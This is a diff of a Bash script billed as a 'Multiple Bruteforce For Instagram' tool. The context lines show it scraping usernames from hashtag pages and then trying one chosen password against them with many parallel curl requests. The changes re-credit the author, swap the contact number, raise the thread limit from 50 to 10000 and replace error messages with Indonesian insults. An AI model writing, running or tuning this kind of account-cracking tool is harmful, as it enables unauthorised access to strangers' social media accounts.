@@ -1,6 +1,6 @@
 # !/bin/bash
-# author         : ./Lolz
-# thanks to      : JavaGhost - @Bashid.org
+# author         : Rifqi Gusfiliandi
+# thanks to      : @rifqigusfiliandii@gmail.com
 # recode tinggal recode aja okeh?, tapi cantumin source 
 # Yamaap kalau scriptnya acak"an:(
 
@@ -14,7 +14,7 @@ cyan='\e[1;36m'
 white='\e[1;37m'
 
 # thread limit => kurangin lebih kecil angkanya boleh, naikin? saran w jangan... awokwowok:v
-limit=50
+limit=10000
 
 # banner
 echo -e $'''
@@ -23,7 +23,7 @@ echo -e $'''
             -=[ Multiple Bruteforce For Instagram ]=-
               
 
-\e[1;31m      contact: https://wa.me/+6288802832083\e[1;37m
+\e[1;31m      contact: https://wa.me/628802080533\e[1;37m
 '''
 
 # dependencies
@@ -59,14 +59,14 @@ case $opt in
         read -p $'\e[37m[\e[34m?\e[37m] Tags for use      : \e[1;33m' hashtag
         get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
         if [[ $get =~ "Page Not Found" ]]; then
-        echo -e "$hashtag : ${red}Hashtag not found${white}"
+        echo -e "$hashtag : ${red}Hashtag TIDAK ADA TOLOL${white}"
         exit
         else
             echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
             echo -e "${white}[${blue}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
             echo -e "[${blue}+${white}] Just found        : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
             read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
-            echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
+            echo -e "${white}[${yellow}!${white}] ${red}Start LOANJING...${white}"
             for tag in $(cat hashtag); do
                 echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
             done
@@ -77,7 +77,7 @@ case $opt in
     3) # menu 3
         read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
         if [[ ! -e $list ]]; then
-            echo -e "${red}file not found${white}"
+            echo -e "${red}FILE TIDAK ADA GOBLOK!!!${white}"
             exit
             else
                 cat $list > target
